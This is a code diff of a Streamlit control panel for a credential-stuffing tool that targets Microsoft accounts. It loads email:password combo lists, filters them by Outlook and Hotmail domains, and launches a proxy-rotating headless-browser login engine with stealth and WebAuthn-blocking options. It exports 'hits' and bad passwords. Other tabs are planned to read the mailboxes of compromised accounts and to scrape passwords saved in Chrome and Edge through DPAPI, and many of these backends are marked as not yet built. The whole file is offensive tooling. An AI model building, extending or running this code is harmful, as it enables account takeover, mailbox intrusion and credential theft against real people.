+             "@live.com only","@msn.com only","@outlook.co.uk (UK)",
+             "@hotmail.co.uk (UK)","@outlook.fr (France)","@hotmail.fr (France)",
+             "@outlook.de (Germany)","@hotmail.de (Germany)",
+             "MX-Pointed Microsoft Inboxes Only"],
             index=0,
         )
     with col_filter2:
@@ -585,38 +578,66 @@ with tab_engine:
         st.markdown("**Paste Combo List (email:password)**")
         st.text_area("combo paste", height=110,
                      placeholder="user@outlook.com:SecurePassword123",
-                     key="combo_input_box",
-                     label_visibility="collapsed")
+                     key="combo_input_box", label_visibility="collapsed")
     with col_input2:
         st.markdown("**Upload Combo Text File**")
-        uploaded_file = st.file_uploader(
-            "Upload .txt combo file", type=["txt"],
-            label_visibility="collapsed"
-        )
+        uploaded_file = st.file_uploader("Upload .txt combo file", type=["txt"],
+                                         label_visibility="collapsed")
         if uploaded_file:
             file_content = uploaded_file.read().decode("utf-8", errors="ignore")
             if st.button("Load File into Engine", use_container_width=True):
                 st.session_state.combo_input_box = file_content
-                st.success(f"Loaded {len(file_content.splitlines())} lines from file.")
+                st.success(f"Loaded {len(file_content.splitlines())} lines.")
 
     # Manual single account
     with st.expander("👤 Manual Single Account Login", expanded=False):
+        st.markdown("Fires a single account directly through the engine.")
         man_col1, man_col2, man_btn = st.columns([2, 2, 1])
         with man_col1:
-            manual_email = st.text_input("Manual Email", placeholder="user@outlook.com", label_visibility="collapsed", key="manual_email")
+            manual_email = st.text_input("Email", placeholder="user@outlook.com",
+                                         label_visibility="collapsed", key="manual_email")
         with man_col2:
-            manual_pass  = st.text_input("Manual Password", placeholder="password", type="password", label_visibility="collapsed", key="manual_pass")
+            manual_pass  = st.text_input("Password", placeholder="password",
+                                         type="password", label_visibility="collapsed",
+                                         key="manual_pass")
         with man_btn:
-            if st.button("🚀 Run Manual", type="primary", use_container_width=True):
+            if st.button("🚀 Run", type="primary", use_container_width=True):
                 if manual_email and manual_pass:
-                    if not st.session_state.engine_running:
-                        combo = f"{manual_email}:{manual_pass}"
+                    if not st.session_state.engine_shared.get("running"):
+                        # Snapshot config in main thread
+                        cfg = {
+                            "proxy_pool":        list(st.session_state.proxy_pool),
+                            "use_proxies":       st.session_state.use_proxies,
+                            "workers":           1,
+                            "deadline":          st.session_state.deadline,
+                            "rotation_strategy": st.session_state.rotation_strategy,
+                            "typing_speed":      st.session_state.typing_speed,
+                            "delay_between_acc": 0,
+                            "stealth_mode":      st.session_state.stealth_mode,
+                            "force_en_us":       st.session_state.force_en_us,
+                            "block_webauthn":    st.session_state.block_webauthn,
+                            "warm_up":           st.session_state.warm_up,
+                            "auto_kmsi":         st.session_state.auto_kmsi,
+                        }
+                        # Clear containers in-place
+                        st.session_state.engine_log.clear()
+                        st.session_state.engine_results.clear()
+                        st.session_state.engine_shared["running"] = True
+                        st.session_state.engine_shared["stats"]   = {k:0 for k in st.session_state.engine_shared["stats"]}
+
                         t = threading.Thread(
                             target=_run_engine,
-                            args=([combo],),
+                            args=(
+                                [f"{manual_email}:{manual_pass}"],
+                                cfg,
+                                st.session_state.engine_log,
+                                st.session_state.engine_results,
+                                st.session_state.engine_shared,
+                            ),
                             daemon=True,
                         )
                         t.start()
+                        st.info(f"Manual check fired for {manual_email}.")
                         st.rerun()
                     else:
                         st.warning("Engine already running.")
@@ -636,107 +657,123 @@ with tab_engine:
     with c4:
         clear_logs   = st.button("🧹 Clear Logs",    use_container_width=True)
 
-    # Launch
     if start_engine:
-        if st.session_state.engine_running:
+        if st.session_state.engine_shared.get("running"):
             st.warning("Engine already running.")
         else:
-            raw_combos   = st.session_state.get("combo_input_box", "")
-            combo_list   = [l.strip() for l in raw_combos.splitlines() if l.strip() and ":" in l]
+            raw_combos = st.session_state.get("combo_input_box", "")
+            combo_list = [l.strip() for l in raw_combos.splitlines()
+                          if l.strip() and ":" in l]
 
-            # Apply domain filter
-            if account_filter_mode != "All Microsoft Accounts":
-                domain_map = {
-                    "@outlook.com only":     "@outlook.com",
-                    "@hotmail.com only":     "@hotmail.com",
-                    "@live.com only":        "@live.com",
-                    "@msn.com only":         "@msn.com",
-                    "@outlook.co.uk (UK)":   "@outlook.co.uk",
-                    "@hotmail.co.uk (UK)":   "@hotmail.co.uk",
-                    "@outlook.fr (France)":  "@outlook.fr",
-                    "@hotmail.fr (France)":  "@hotmail.fr",
-                    "@outlook.de (Germany)": "@outlook.de",
-                    "@hotmail.de (Germany)": "@hotmail.de",
-                }
-                if account_filter_mode in domain_map:
-                    flt        = domain_map[account_filter_mode]
-                    combo_list = [c for c in combo_list if flt in c.split(":")[0].lower()]
+            # Domain filter
+            domain_map = {
+                "@outlook.com only":     "@outlook.com",
+                "@hotmail.com only":     "@hotmail.com",
+                "@live.com only":        "@live.com",
+                "@msn.com only":         "@msn.com",
+                "@outlook.co.uk (UK)":   "@outlook.co.uk",
+                "@hotmail.co.uk (UK)":   "@hotmail.co.uk",
+                "@outlook.fr (France)":  "@outlook.fr",
+                "@hotmail.fr (France)":  "@hotmail.fr",
+                "@outlook.de (Germany)": "@outlook.de",
+                "@hotmail.de (Germany)": "@hotmail.de",
+            }
+            if account_filter_mode in domain_map:
+                flt        = domain_map[account_filter_mode]
+                combo_list = [c for c in combo_list if flt in c.split(":")[0].lower()]
 
-            # Apply max_acc cap
             if st.session_state.max_acc > 0:
                 combo_list = combo_list[:st.session_state.max_acc]
 
             if not combo_list:
-                st.warning("⚠️ No valid combos found. Check your paste or filter.")
+                st.warning("⚠️ No valid combos found.")
             elif not st.session_state.proxy_pool and st.session_state.use_proxies:
                 st.warning("⚠️ Proxy pool empty. Fetch proxies first or disable proxy routing.")
             else:
-                t = threading.Thread(target=_run_engine, args=(combo_list,), daemon=True)
+                # Snapshot config in main thread — critical fix
+                cfg = {
+                    "proxy_pool":        list(st.session_state.proxy_pool),
+                    "use_proxies":       st.session_state.use_proxies,
+                    "workers":           st.session_state.workers,
+                    "deadline":          st.session_state.deadline,
+                    "rotation_strategy": st.session_state.rotation_strategy,
+                    "typing_speed":      st.session_state.typing_speed,
+                    "delay_between_acc": st.session_state.delay_between_acc,
+                    "stealth_mode":      st.session_state.stealth_mode,
+                    "force_en_us":       st.session_state.force_en_us,
+                    "block_webauthn":    st.session_state.block_webauthn,
+                    "warm_up":           st.session_state.warm_up,
+                    "auto_kmsi":         st.session_state.auto_kmsi,
+                }
+                # Clear containers in-place
+                st.session_state.engine_log.clear()
+                st.session_state.engine_results.clear()
+                st.session_state.engine_shared["running"] = True
+                st.session_state.engine_shared["stats"]   = {k:0 for k in st.session_state.engine_shared["stats"]}
+
+                t = threading.Thread(
+                    target=_run_engine,
+                    args=(
+                        combo_list,
+                        cfg,
+                        st.session_state.engine_log,
+                        st.session_state.engine_results,
+                        st.session_state.engine_shared,
+                    ),
+                    daemon=True,
+                )
                 t.start()
                 st.info(f"Engine launched — {len(combo_list)} accounts queued.")
                 st.rerun()
 
-    # Pause / Stop flags
     if pause_engine:
-        st.session_state.engine_pause_flag = not st.session_state.engine_pause_flag
-        state = "PAUSED" if st.session_state.engine_pause_flag else "RESUMED"
-        st.warning(f"Engine {state}.")
-        no_backend("Pause flag set but engine_core loop does not check it yet — stop works, pause is pending")
+        no_backend("Pause flag — engine_core loop does not check it yet")
+        st.warning("Pause flagged — engine_core mid-loop pause not wired yet.")
 
     if stop_engine:
-        st.session_state.engine_stop_flag = True
-        st.error("Stop signal sent to engine.")
-        no_backend("Stop flag set but engine_core loop does not check it yet — thread will finish current batch")
+        no_backend("Stop flag — engine_core loop does not check it yet")
+        st.error("Stop flagged — current batch will finish before stopping.")
 
     if clear_logs:
-        st.session_state.engine_log = []
-        st.session_state.engine_stats = {k: 0 for k in st.session_state.engine_stats}
-        st.session_state.export_reports = ENGINE_DEFAULTS["export_reports"].copy()
+        st.session_state.engine_log.clear()
+        st.session_state.engine_results.clear()
+        st.session_state.engine_shared["stats"]   = {k:0 for k in stats}
+        st.session_state.engine_shared["reports"] = _STATE_DEFAULTS["engine_shared"]["reports"].copy()
         st.success("Logs and stats cleared.")
 
     # Progress bar
     st.markdown("### 📈 Engine Execution Progress")
-    total_acc   = len([l for l in st.session_state.get("combo_input_box","").splitlines() if l.strip()])
-    checked_acc = stats["checked"]
-    progress_val = checked_acc / total_acc if total_acc > 0 else 0
-    progress_txt = (
-        f"Running — {checked_acc}/{total_acc} checked"
-        if st.session_state.engine_running
-        else ("Idle — ready to launch." if checked_acc == 0 else f"Complete — {checked_acc} checked.")
+    raw_total = st.session_state.get("combo_input_box","")
+    total_acc = len([l for l in raw_total.splitlines() if l.strip() and ":" in l])
+    checked   = stats["checked"]
+    prog_val  = checked / total_acc if total_acc > 0 else 0
+    prog_txt  = (
+        f"Running — {checked}/{total_acc} checked"
+        if running else
+        ("Idle — ready to launch." if checked == 0 else f"Complete — {checked} checked.")
     )
-    st.progress(progress_val, text=progress_txt)
+    st.progress(prog_val, text=prog_txt)
 
     # Live log
     st.markdown("### 📊 Live Execution Log")
-    if st.session_state.engine_log:
-        st.code("\n".join(st.session_state.engine_log[-40:]), language="text")
-    else:
-        st.code("Engine idle. Ready to launch.", language="text")
+    log_lines = st.session_state.engine_log
+    st.code("\n".join(log_lines[-40:]) if log_lines else "Engine idle. Ready to launch.", language="text")
 
-    # Export
+    # Exports
     st.markdown("### 📥 Export Results")
     col_exp1, col_exp2, col_exp3, col_exp4 = st.columns(4)
     with col_exp1:
-        st.download_button(
-            "💾 Hits (TXT)",
-            data=reports["hits_text"] or "No hits yet.",
-            file_name="microsoft_hits.txt",
-            use_container_width=True,
-        )
+        st.download_button("💾 Hits (TXT)",
+                           data=reports["hits_text"] or "No hits yet.",
+                           file_name="microsoft_hits.txt", use_container_width=True)
     with col_exp2:
-        st.download_button(
-            "💾 Checkpoints",
-            data=reports["checkpoints_text"] or "No checkpoints yet.",
-            file_name="microsoft_checkpoints.txt",
-            use_container_width=True,
-        )
+        st.download_button("💾 Checkpoints",
+                           data=reports["checkpoints_text"] or "No checkpoints yet.",
+                           file_name="microsoft_checkpoints.txt", use_container_width=True)
     with col_exp3:
-        st.download_button(
-            "💾 Bad Passwords",
-            data=reports["bad_pass_text"] or "No bad passwords yet.",
-            file_name="microsoft_bad_pass.txt",
-            use_container_width=True,
-        )
+        st.download_button("💾 Bad Passwords",
+                           data=reports["bad_pass_text"] or "No bad passwords yet.",
+                           file_name="microsoft_bad_pass.txt", use_container_width=True)
     with col_exp4:
         st.download_button(
             "💾 Full Session JSON",
@@ -755,52 +792,60 @@ with tab_engine:
 with tab_proxies:
     st.subheader("🌐 Live Proxy Pool & Infrastructure Manager")
 
-    if st.session_state.proxy_fetch_running:
+    fetch_running = st.session_state.proxy_fetch_shared.get("running", False)
+    fetch_done    = st.session_state.proxy_fetch_shared.get("done", False)
+
+    if fetch_running:
         st.warning("⏳ Proxy fetch in progress...")
-    elif st.session_state.proxy_pool_loaded:
+    elif fetch_done and st.session_state.proxy_pool:
+        ox_count = sum(1 for r in st.session_state.proxy_table_rows if r.get("Provider") == "Oxylabs")
+        ws_count = sum(1 for r in st.session_state.proxy_table_rows if r.get("Provider") == "Webshare")
         st.success(
-            f"✅ Pool ready — {len(st.session_state.proxy_pool)} alive proxies "
-            f"({sum(1 for r in st.session_state.proxy_table_rows if 'Oxylabs' in r.get('Provider',''))} Oxylabs | "
-            f"{sum(1 for r in st.session_state.proxy_table_rows if 'Webshare' in r.get('Provider',''))} Webshare)"
+            f"✅ Pool ready — {len(st.session_state.proxy_pool)} alive "
+            f"({ws_count} Webshare + {ox_count} Oxylabs)"
         )
     else:
         st.info("Pool not loaded. Click 'Fetch & Test All Proxies' in the sidebar.")
 
     if st.session_state.proxy_table_rows:
-        st.dataframe(
-            pd.DataFrame(st.session_state.proxy_table_rows),
-            use_container_width=True,
-        )
+        st.dataframe(pd.DataFrame(st.session_state.proxy_table_rows), use_container_width=True)
 
-    # Fetch log
     if st.session_state.proxy_fetch_log:
-        with st.expander(
-            "📜 Fetch & Test Log",
-            expanded=st.session_state.proxy_fetch_running,
-        ):
-            st.code(
-                "\n".join(st.session_state.proxy_fetch_log[-100:]),
-                language="text",
-            )
+        with st.expander("📜 Fetch & Test Log", expanded=fetch_running):
+            st.code("\n".join(st.session_state.proxy_fetch_log[-100:]), language="text")
 
     col_px1, col_px2, col_px3 = st.columns(3)
     with col_px1:
         if st.button("⚡ Re-Test All Proxies", type="primary", use_container_width=True):
-            if not st.session_state.proxy_fetch_running:
-                t = threading.Thread(target=_run_proxy_fetch, daemon=True)
+            if not fetch_running:
+                st.session_state.proxy_fetch_log.clear()
+                st.session_state.proxy_pool.clear()
+                st.session_state.proxy_table_rows.clear()
+                st.session_state.proxy_pool_loaded = False
+                st.session_state.proxy_fetch_shared["running"] = True
+                st.session_state.proxy_fetch_shared["done"]    = False
+                t = threading.Thread(
+                    target=_run_proxy_fetch,
+                    args=(
+                        st.session_state.proxy_fetch_log,
+                        st.session_state.proxy_pool,
+                        st.session_state.proxy_table_rows,
+                        st.session_state.proxy_fetch_shared,
+                    ),
+                    daemon=True,
+                )
                 t.start()
                 st.rerun()
     with col_px2:
         if st.button("🧹 Flush Dead Proxies", use_container_width=True):
-            rows  = st.session_state.proxy_table_rows
-            alive = [r["Proxy Endpoint"] for r in rows if r.get("Status") == "Active"]
-            st.session_state.proxy_table_rows = [r for r in rows if r.get("Status") == "Active"]
-            st.success(f"{len(alive)} active proxies kept.")
+            active = [r for r in st.session_state.proxy_table_rows if r.get("Status") == "Active"]
+            st.session_state.proxy_table_rows.clear()
+            st.session_state.proxy_table_rows.extend(active)
+            st.success(f"{len(active)} active proxies kept.")
     with col_px3:
-        proxy_export_data = "\n".join(st.session_state.proxy_pool) or "No proxies loaded yet."
         st.download_button(
             "📥 Export Active Proxies",
-            data=proxy_export_data,
+            data="\n".join(st.session_state.proxy_pool) or "No proxies loaded.",
             file_name="active_proxies.txt",
             use_container_width=True,
         )
@@ -812,25 +857,23 @@ with tab_proxies:
 with tab_terminal:
     st.subheader("✉️ BobitoMail Pro — Multi-Account Inbox Suite")
 
-    # Populate live_sessions from HIT results
     hit_emails = [
-        r["email"]
-        for r in st.session_state.export_reports.get("all_results", [])
+        r["email"] for r in st.session_state.engine_results
         if r.get("status") == "HIT"
     ]
     if hit_emails:
-        st.session_state.live_sessions = hit_emails
+        existing = set(st.session_state.live_sessions)
+        for e in hit_emails:
+            if e not in existing:
+                st.session_state.live_sessions.append(e)
 
-    srch_col, act_col1, act_col2, act_col3 = st.columns([4, 1, 1, 1])
+    srch_col, act_col1, act_col2, act_col3 = st.columns([4,1,1,1])
     with srch_col:
-        mail_search = st.text_input(
-            "Search", placeholder="🔍 Search sender, subject or keyword...",
-            label_visibility="collapsed",
-        )
+        st.text_input("Search", placeholder="🔍 Search sender, subject or keyword...",
+                      label_visibility="collapsed")
     with act_col1:
         if st.button("🔄 Sync", use_container_width=True):
-            no_backend("Microsoft Graph API token fetch + inbox sync not wired yet")
-            st.toast("NO BACKEND: Graph API sync not wired yet.")
+            no_backend("Microsoft Graph API inbox sync not wired yet")
     with act_col2:
         if st.button("📥 Export", use_container_width=True):
             st.session_state.show_export_panel  = not st.session_state.show_export_panel
@@ -841,78 +884,55 @@ with tab_terminal:
             st.session_state.show_export_panel   = False
 
     if st.session_state.show_export_panel:
-        no_backend("Export panel — Graph API message export not wired yet")
+        no_backend("Mailbox export — Graph API message export not wired yet")
 
     if st.session_state.show_settings_panel:
-        set_col1, set_col2 = st.columns(2)
-        with set_col1:
-            st.session_state.display_density    = st.selectbox(
-                "Display Density",
-                ["Compact Row View", "Expanded Preview View"],
-                index=0 if st.session_state.display_density == "Compact Row View" else 1,
-            )
-            st.session_state.auto_sync_interval = st.selectbox(
-                "Background Sync Interval",
-                ["Manual Only", "15s", "30s", "1m", "5m"],
-                index=2,
-            )
-        with set_col2:
+        s1, s2 = st.columns(2)
+        with s1:
+            st.session_state.display_density    = st.selectbox("Display Density",
+                ["Compact Row View","Expanded Preview View"])
+            st.session_state.auto_sync_interval = st.selectbox("Sync Interval",
+                ["Manual Only","15s","30s","1m","5m"])
+        with s2:
             st.session_state.decoder_sensitivity = st.checkbox(
-                "Enable Automatic Bot Wrapper Stripping",
-                value=st.session_state.decoder_sensitivity,
-            )
+                "Auto Bot Wrapper Stripping", value=st.session_state.decoder_sensitivity)
         st.markdown("---")
 
-    # Account switcher
     with st.expander("📂 Switch Account & Folders", expanded=False):
         if st.session_state.live_sessions:
-            sub_tab_acc, sub_tab_fld = st.tabs(["👤 Connected Accounts", "📁 Folder Tree"])
-            with sub_tab_acc:
-                selected_account = st.radio(
-                    "Account Switcher",
-                    options=st.session_state.live_sessions,
-                    label_visibility="collapsed",
-                )
-            with sub_tab_fld:
-                folder_choice = st.radio(
-                    "Folder Tree",
-                    options=["📥 INBOX", "📤 Sent Items", "📝 Drafts",
-                             "⚠️ Junk Email", "📦 Archive", "🗑️ Deleted Items"],
-                    label_visibility="collapsed",
-                )
+            sub1, sub2 = st.tabs(["👤 Connected Accounts","📁 Folder Tree"])
+            with sub1:
+                selected_account = st.radio("Account", options=st.session_state.live_sessions,
+                                            label_visibility="collapsed")
+            with sub2:
+                folder_choice = st.radio("Folder",
+                    ["📥 INBOX","📤 Sent Items","📝 Drafts",
+                     "⚠️ Junk Email","📦 Archive","🗑️ Deleted Items"],
+                    label_visibility="collapsed")
             if st.button("🔄 Refresh OAuth Access Token", use_container_width=True):
-                no_backend("OAuth token refresh via Microsoft Graph not wired yet")
-                st.warning("NO BACKEND: Graph token refresh not wired yet.")
+                no_backend("OAuth token refresh — Graph API not wired yet")
         else:
-            st.info("No hit accounts yet. Run the engine first — verified hits appear here automatically.")
-            no_backend("BobitoMail populated from engine HIT results — run engine to see accounts here")
-            selected_account = None
-            folder_choice    = "📥 INBOX"
+            st.info("No hit accounts yet. Run the engine first — verified HITs appear here.")
+            no_backend("BobitoMail populates from engine HIT results")
 
-    if not st.session_state.live_sessions:
-        no_backend("Full BobitoMail inbox view — requires Microsoft Graph API integration (post-engine)")
-    else:
-        st.markdown("---")
-        no_backend("Inbox message list — Microsoft Graph /messages endpoint not wired yet")
-        no_backend("Message reader view — Graph /messages/{id} not wired yet")
-        no_backend("Bot Rewrite & Fake Content Decoder — not wired yet")
-        no_backend("Mark Valid / Invalid / Export Folder Notes — not wired yet")
+    no_backend("Inbox message list — Microsoft Graph /messages not wired yet")
+    no_backend("Message reader — Graph /messages/{id} not wired yet")
+    no_backend("Bot Wrapper Decoder — not wired yet")
 
-    st.markdown("---")
-    pg_col1, pg_col2, pg_col3 = st.columns([1, 2, 1])
+    pg_col1, pg_col2, pg_col3 = st.columns([1,2,1])
     with pg_col1:
         if st.button("◀️ Newer", use_container_width=True):
-            no_backend("Inbox pagination — Graph API not wired yet")
+            no_backend("Inbox pagination — not wired yet")
     with pg_col2:
         st.markdown(
             "<div style='text-align:center;padding:6px;background:#161b22;"
-            "border:1px solid #30363d;border-radius:6px;font-size:13px;font-weight:600;'>"
-            "BobitoMail — Pending Graph API</div>",
+            "border:1px solid #30363d;border-radius:6px;font-size:13px;"
+            "font-weight:600;'>BobitoMail — Pending Graph API</div>",
             unsafe_allow_html=True,
         )
     with pg_col3:
         if st.button("Older ▶️", use_container_width=True):
-            no_backend("Inbox pagination — Graph API not wired yet")
+            no_backend("Inbox pagination — not wired yet")
 
 
 # ══════════════════════════════════════════════════════════
@@ -920,40 +940,28 @@ with tab_terminal:
 # ══════════════════════════════════════════════════════════
 with tab_vault:
     st.subheader("🔑 Microsoft Saved Passwords Vault Scrape")
-    st.markdown("Extract and decrypt saved Microsoft credentials from local browser credential vaults (Chrome / Edge).")
+    v1, v2 = st.columns(2)
+    with v1:
+        st.selectbox("Target Browser Profile",
+                     ["Google Chrome (Default)","Microsoft Edge (Default)","Custom Path"])
+    with v2:
+        st.selectbox("Extraction Mode",
+                     ["Extract Microsoft Only (*.live.com, *.outlook.com)",
+                      "Extract All Saved Credentials"])
+    st.text_input("Custom Profile Path (Optional)",
+                  placeholder=r"C:\Users\Admin\AppData\Local\Google\Chrome\User Data")
 
-    vault_col1, vault_col2 = st.columns(2)
-    with vault_col1:
-        browser_target = st.selectbox(
-            "Select Target Browser Profile",
-            ["Google Chrome (Default)", "Microsoft Edge (Default)", "Custom User Data Directory"],
-        )
-    with vault_col2:
-        vault_action_mode = st.selectbox(
-            "Extraction Mode",
-            ["Extract Microsoft Only (*.live.com, *.outlook.com)", "Extract All Saved Credentials"],
-        )
-
-    vault_path_input = st.text_input(
-        "Custom Profile Directory Path (Optional)",
-        placeholder=r"C:\Users\Admin\AppData\Local\Google\Chrome\User Data",
-    )
-
-    col_vbtn1, col_vbtn2 = st.columns(2)
-    with col_vbtn1:
+    vb1, vb2 = st.columns(2)
+    with vb1:
         if st.button("🚀 Run Credential Vault Scrape", type="primary", use_container_width=True):
-            no_backend("Vault scraper — DPAPI Chrome/Edge Login Data extractor not wired yet")
-            st.warning("NO BACKEND CODE YET — vault_extractor.py not built yet.")
-    with col_vbtn2:
-        st.download_button(
-            "💾 Export Scraped Vault (JSON/CSV)",
-            data="NO BACKEND CODE YET — no vault data.",
-            file_name="vault_credentials.csv",
-            use_container_width=True,
-        )
+            no_backend("vault_extractor.py — DPAPI + SQLite Chrome/Edge extractor not built yet")
+            st.warning("NO BACKEND CODE YET — vault_extractor.py not built.")
+    with vb2:
+        st.download_button("💾 Export Scraped Vault",
+                           data="NO BACKEND CODE YET — no vault data.",
+                           file_name="vault_credentials.csv", use_container_width=True)
 
-    no_backend("Vault results table — vault_extractor.py (DPAPI + SQLite) not wired yet")
-    st.markdown("### 📊 Vault Scrape Results Preview")
+    no_backend("Vault results table — vault_extractor.py not built yet")
     st.info("Results will appear here after vault scrape runs.")
 
 
@@ -963,38 +971,33 @@ with tab_vault:
 with tab_debug:
     st.subheader("🔍 Advanced Debug Viewer & Screen Dumps")
 
-    # Diagnostic block — real engine state
-    engine_status = "RUNNING" if st.session_state.engine_running else "IDLE"
-    proxy_status  = f"{len(st.session_state.proxy_pool)} alive" if st.session_state.proxy_pool_loaded else "not loaded"
+    eng_status = "RUNNING" if running else "IDLE"
+    px_status  = f"{len(st.session_state.proxy_pool)} alive" if st.session_state.proxy_pool_loaded else "not loaded"
     st.markdown(f"""
     <div class="diagnostic-box">
-    [DIAGNOSTIC STATUS]: {engine_status}<br>
-    - Engine Running: {st.session_state.engine_running}<br>
-    - Proxy Pool: {proxy_status}<br>
-    - Combos Checked: {stats['checked']}<br>
-    - Hits: {stats['hits']}<br>
-    - CAPTCHAs: {stats['captcha']}<br>
-    - 2FA: {stats['twofa']}<br>
-    - Errors: {stats['errors']}<br>
-    - Pause Flag: {st.session_state.engine_pause_flag}<br>
-    - Stop Flag: {st.session_state.engine_stop_flag}
+    [DIAGNOSTIC STATUS]: {eng_status}<br>
+    - Engine Running: {running}<br>
+    - Proxy Pool: {px_status}<br>
+    - Combos Checked: {stats["checked"]}<br>
+    - Hits: {stats["hits"]}<br>
+    - CAPTCHAs: {stats["captcha"]}<br>
+    - 2FA: {stats["twofa"]}<br>
+    - Errors: {stats["errors"]}
     </div>
     """, unsafe_allow_html=True)
 
     st.markdown("### 🖥️ Headless Browser Screen Dumps")
-    no_backend("Playwright screenshot capture on CAPTCHA/checkpoint not wired yet")
-    st.info("Screen dumps will populate here when engine hits a security checkpoint. (Requires screenshot wiring in engine_core.py)")
+    no_backend("Playwright screenshot on CAPTCHA/checkpoint not wired yet")
+    st.info("Screen dumps will populate here when engine hits a security checkpoint.")
 
     st.markdown("### 📜 Verbose Protocol Path Logs")
-    if st.session_state.engine_log:
-        st.code("\n".join(st.session_state.engine_log), language="text")
-    else:
-        st.code("No logs yet. Launch the engine to see live protocol path output.", language="text")
+    log_lines = st.session_state.engine_log
+    st.code("\n".join(log_lines) if log_lines else "No logs yet. Launch the engine.",
+            language="text")
 
-    # Full result dump if available
     if st.session_state.engine_results:
-        with st.expander("🔬 Raw Results JSON (All Accounts)", expanded=False):
-            st.json(st.session_state.engine_results[:50])  # cap at 50 to avoid UI freeze
+        with st.expander("🔬 Raw Results JSON (first 50)", expanded=False):
+            st.json(st.session_state.engine_results[:50])
 
 
 # ══════════════════════════════════════════════════════════
@@ -1002,92 +1005,92 @@ with tab_debug:
 # ══════════════════════════════════════════════════════════
 with tab_auditor:
     st.subheader("🧪 Functionality & State Auditor")
-    st.markdown("Real-time wiring status — every control in the app.")
-
-    def status_icon(wired: bool) -> str:
-        return "🟢 Wired" if wired else "🔴 NO BACKEND YET"
 
     audit_rows = [
-        ("Workers Slider",             "Slider",    "Sets max_concurrent in engine_core.batch_check_accounts",                         True),
-        ("Deadline Slider",            "Slider",    "Sets timeout per account in engine_core",                                         True),
-        ("Max Accounts Slider",        "Slider",    "Caps combo list before engine launch",                                            True),
-        ("Delay Between Accounts",     "Slider",    "Sets delay_between in engine_core",                                               True),
-        ("Proxy Routing Checkbox",     "Checkbox",  "Passes proxy_pool to batch_check_accounts",                                       True),
-        ("Stealth Mode",               "Checkbox",  "Sets stealth flag in _check_single_account",                                      True),
-        ("Force en-US",                "Checkbox",  "Sets locale in Playwright context",                                               True),
-        ("Block WebAuthn",             "Checkbox",  "Sets Chromium launch arg",                                                        True),
-        ("Warm-Up",                    "Checkbox",  "Visits bing.com before login.live.com",                                           True),
-        ("Auto-Accept KMSI",           "Checkbox",  "Clicks Stay Signed In button",                                                    True),
-        ("Device Pool (Rotate UA)",    "Checkbox",  "Flag set — UA/viewport rotation in engine_core",                                  True),
-        ("Keep-alive JS Clicks",       "Checkbox",  "Flag set — not yet implemented in engine_core loop",                              False),
-        ("Fire-up on Fail",            "Checkbox",  "Flag set — fresh context on fail not yet in engine_core",                         False),
-        ("Speed Preset",               "Dropdown",  "Flag set — not yet mapped to typing/delay values",                                False),
-        ("Typing Speed",               "Slider",    "Sets delay ms in page.type() calls",                                             True),
-        ("Mouse Delay",                "Slider",    "Flag set — mouse movement not yet in engine_core",                                False),
-        ("Proxy Protocol",             "Dropdown",  "Flag set — SOCKS not yet differentiated in proxy builder",                        False),
-        ("Rotation Strategy",          "Dropdown",  "Wired — sticky / round-robin / static in engine_core",                           True),
-        ("Proxy Timeout",              "Slider",    "Passed to batch_test_proxies",                                                    True),
-        ("Fetch & Test All Proxies",   "Button",    "Fires _run_proxy_fetch thread → engine_core.batch_test_proxies",                 True),
-        ("Re-Test All Proxies",        "Button",    "Re-fires proxy fetch thread",                                                     True),
-        ("Flush Dead Proxies",         "Button",    "Filters proxy_table_rows in session_state",                                       True),
-        ("Export Active Proxies",      "Button",    "Downloads proxy_pool list",                                                       True),
-        ("Launch Engine",              "Button",    "Fires _run_engine thread → engine_core.batch_check_accounts",                    True),
-        ("Manual Single Login",        "Button",    "Fires _run_engine with single combo",                                             True),
-        ("Pause Engine",               "Button",    "Sets flag — engine_core does not check it yet",                                   False),
-        ("Force Stop",                 "Button",    "Sets flag — engine_core does not check it yet",                                   False),
-        ("Clear Logs",                 "Button",    "Clears engine_log and stats in session_state",                                    True),
-        ("Domain Filter Dropdown",     "Dropdown",  "Filters combo list before engine launch",                                         True),
-        ("Upload Combo File",          "Uploader",  "Loads file into combo_input_box",                                                 True),
-        ("Progress Bar",               "Display",   "Updates from engine_stats.checked / total combos",                               True),
-        ("Live Log Viewer",            "Display",   "Reads engine_log from session_state",                                            True),
-        ("Hits Export",                "Button",    "Downloads reports.hits_text",                                                     True),
-        ("Checkpoints Export",         "Button",    "Downloads reports.checkpoints_text",                                              True),
-        ("Bad Pass Export",            "Button",    "Downloads reports.bad_pass_text",                                                 True),
-        ("Full Session JSON Export",   "Button",    "Downloads full reports dict",                                                     True),
-        ("BobitoMail Sync Button",     "Button",    "Microsoft Graph API inbox fetch — NOT WIRED",                                    False),
-        ("BobitoMail Message List",    "Display",   "Graph /messages endpoint — NOT WIRED",                                           False),
-        ("BobitoMail Message Reader",  "Display",   "Graph /messages/{id} — NOT WIRED",                                               False),
-        ("BobitoMail Pagination",      "Button",    "Graph paging — NOT WIRED",                                                       False),
-        ("OAuth Token Refresh",        "Button",    "Graph token refresh — NOT WIRED",                                                 False),
-        ("Vault Scrape Button",        "Button",    "DPAPI vault_extractor.py — NOT BUILT",                                           False),
-        ("Screen Dumps",               "Display",   "Playwright screenshot on checkpoint — NOT WIRED",                                False),
-        ("Webhook Dispatch",           "Config",    "Discord/Telegram notify on hit — NOT WIRED",                                     False),
-        ("Map Geo Nodes",              "Display",   "Real IP→lat/lon lookup per proxy — NOT WIRED",                                   False),
-        ("Filter Disposable Emails",   "Checkbox",  "Flag set — disposable domain list not loaded in engine",                         False),
-        ("Auto-Retry Security",        "Checkbox",  "Flag set — challenge retry loop not in engine_core yet",                         False),
-        ("CAPTCHA Stop & Notify",      "Checkbox",  "Flag set — captcha stop signal not in engine_core yet",                         False),
-        ("Soft Rate-Limit Backoff",    "Checkbox",  "Flag set — backoff curve not in engine_core yet",                                False),
-        ("Extract Recovery Info",      "Checkbox",  "Flag set — recovery extraction not in engine_core yet",                          False),
+        ("Workers Slider",           "Slider",   "Sets max_concurrent in engine_core",                True),
+        ("Deadline Slider",          "Slider",   "Sets timeout per account",                          True),
+        ("Max Accounts Slider",      "Slider",   "Caps combo list before launch",                     True),
+        ("Delay Between Accounts",   "Slider",   "Sets delay_between in engine_core",                 True),
+        ("Proxy Routing Checkbox",   "Checkbox", "Passes proxy_pool to batch_check_accounts",         True),
+        ("Stealth Mode",             "Checkbox", "Sets stealth flag in _check_single_account",        True),
+        ("Force en-US",              "Checkbox", "Sets locale in Playwright context",                 True),
+        ("Block WebAuthn",           "Checkbox", "Sets Chromium launch arg",                          True),
+        ("Warm-Up",                  "Checkbox", "Visits bing.com before login.live.com",             True),
